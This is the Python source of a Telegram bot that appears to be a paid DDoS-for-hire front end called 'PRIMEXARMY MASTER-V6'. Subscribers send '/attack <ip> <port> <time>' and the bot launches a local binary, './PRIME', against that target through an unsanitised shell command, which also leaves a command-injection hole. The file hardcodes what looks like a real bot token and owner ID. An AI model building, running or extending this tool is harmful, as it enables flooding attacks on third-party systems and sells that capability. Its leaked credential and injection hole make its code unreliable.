import os, time, json, subprocess
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

TOKEN = os.getenv("API_KEY", "8284925570:AAFAp4vNtcSxRZ8ur1ZyPlfZ_TK9dVj8GIU")
OWNER_ID = int(os.getenv("OWNER_ID",1917682089))
BINARY_NAME = "./PRIME"

def load_data(file):
    if os.path.exists(file):
        with open(file, "r") as f: return json.load(f)
    return {}

def save_data(file, data):
    with open(file, "w") as f: json.dump(data, f, indent=4)

users = load_data("users.json")
keys = load_data("keys.json")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid != OWNER_ID and str(uid) not in users:
        await update.message.reply_text(f"❌ Access Denied. ID: {uid}")
        return
    await update.message.reply_text("⚔️ **PRIMEXARMY MASTER-V6**\n\n🚀 `/attack <ip> <port> <time>`")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid != OWNER_ID and (str(uid) not in users or users[str(uid)]['expiry'] < time.time()):
        await update.message.reply_text("❌ No Active Subscription")
        return
    
    if len(context.args) < 3: return
    ip, port, dur = context.args
    await update.message.reply_text(f"🚀 **Attack Sent Successfully!**")
    
    os.chmod(BINARY_NAME, 0o755)
    subprocess.Popen(f"{BINARY_NAME} {ip} {port} {dur}", shell=True)

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    print("🔥 Bot Started!")
    app.run_polling()
